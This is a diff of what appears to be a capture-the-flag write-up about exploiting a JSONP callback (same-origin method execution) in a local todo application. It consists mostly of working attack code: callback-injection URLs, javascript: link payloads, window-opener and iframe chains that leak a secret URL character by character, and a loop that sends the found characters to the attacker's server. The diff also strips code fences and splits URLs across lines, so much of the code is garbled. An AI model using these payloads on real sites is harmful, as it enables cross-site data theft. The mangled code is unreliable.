@@ -24,11 +24,6 @@ code/
 
 docker-compose.yml
 Dockerfile
-```
-
-
-
-```
 router.use((req, res, next) => {
  if (req.user.user === "admin") {
  return res.redirect("/?msg=Nice try");
@@ -38,11 +33,6 @@ router.use((req, res, next) => {
 
 router.post("/create/post" ...)
 router.post("/create/todo" ...)
-```
-
-
-
-```
 let isURL = false;
 try {
  new URL(text); // errors if not valid URL
@@ -54,11 +44,6 @@ try {
 req.user.todos.push({
  text, isURL
 });
-```
-
-
-
-```
 <%_ user.todos.forEach(todo => { _%>
  <%_ if (todo.isURL) { _%>
  <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
@@ -66,23 +51,9 @@ req.user.todos.push({
  <li class="has-text-left"><%= todo.text %></li>
  <%_ } _%>
 <%_ }); _%>
-```
-
-
-
-```
 isURL = !text.toLowerCase().trim().startsWith("javascript:");
-```
-
-
-
-```
-/**/ typeof load_post === 'function' && load_post({"success":true,"name":"X","body":"Y"});
-```
-
-
-
-```
+/**/ typeof load_post === 'function' && load_post({"success":
+true,"name":"X","body":"Y"});
 window.onload = function() {
  const id = new URLSearchParams(window.location.search).get('id');
  if (!id) {
@@ -105,11 +76,6 @@ window.onload = function() {
 
  load_post(JSON.parse(request.responseText));
 }
-```
-
-
-
-```
 // try several different characters with codes from 0 to 1000
 for(i=0; i<1000; i++){
  const request = new XMLHttpRequest();
@@ -120,87 +86,41 @@ for(i=0; i<1000; i++){
  console.log("ERROR :", i, err)
  }
 }
-```
-
-
-
-```
-http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
-```
-
-
-
-```
+http://localhost:
+12345/post/?id={valid_id}?callback=our_function%23%00
 <script src=/api/post/{valid_id}?callback=our_function#%00?callback=load_post></script>
-```
-
-
-
-```
 /**/something({"data":"data"})
-```
-
-
-
-```
 <html>
- <body>
+ 
  <script src='/endpoint?callback=something'></script>
- </body>
+ 
 </html>
-```
-
-
-
-```
 <html>
- <body>
- <a href="javascript:alert()"></a>
- </body>
+ 
+ [](javascript:
+alert())
+ 
 </html>
-```
-
-
-
-```
 <script>
  win1 = open("/click.html")
- location.replace("http://victim.com/link?url=javascript:alert()")
+ location.replace("http://victim.com/link?url=javascript:
+alert()")
 </script>
-```
-
-
-
-```
 <script>
  // wait for start.html to redirect
  setTimeout(`location.replace("http://victim.com/proxy?name=opener.document.body.children[0].click")`, 1000)
 </script>
-```
-
-
-
-```
 <html>
- <body>
+ 
  <script src='/endpoint?callback=opener.document.body.children[0].click'></script>
- </body>
+ 
 </html>
-```
-
-
-
-```
 <script>
  b = open(`/b.html`);
- location.replace("http://localhost:12345/");
+ location.replace("http://localhost:
+12345/");
 </script>
-```
 
-
-
-```
-<body>
  <a id=focusme href=#>sth</a>
  <script>
  const sleep = d => new Promise(r => setTimeout(r, d));
@@ -210,7 +130,8 @@ http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
  for (var i = 0; i < alphabet.length; i++) {
  iframe = document.createElement("iframe");
  iframe.name = alphabet[i];
- iframe.src = "http://localhost:12345/";
+ iframe.src = "http://localhost:
+12345/";
  document.body.appendChild(iframe);
  }
 
@@ -232,7 +153,8 @@ http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
  c = open(`/c.html`);
  await sleep(2000 + 150);
 
- // every 500 secs send found characters to our server endpoint /ret/:characters
+ // every 500 secs send found characters to our server endpoint /ret/:
+characters
  setInterval(() => {
  fetch(`/ret/${hovered.join("")}`)
  }, 500);
@@ -240,21 +162,12 @@ http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
 
  main();
  </script>
-</body>
-```
 
-
-
-```
 <script>
  b = open(`/b.html`);
- location.replace("http://localhost:12345/");
+ location.replace("http://localhost:
+12345/");
 </script>
-```
-
-
-
-```
 <script>
  const sleep = d => new Promise(r => setTimeout(r, d));
 
@@ -267,7 +180,8 @@ http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
  // I'm explainig this payload below
  PAYLOAD = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;
  // change c.html page's location to the vulnerable page that executes callback
- opener.location.replace(`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
+ opener.location.replace(`http://localhost:
+12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
  // check the next character every 1.5 secs so that the page have 1.5 sec to load.
  await sleep(1500);
  }
@@ -275,10 +189,6 @@ http://localhost:12345/post/?id={valid_id}?callback=our_function%23%00
 
  main();
 </script>
-```
-
-
-
-```
-php -S host:port
+php -S host:
+port
 ```
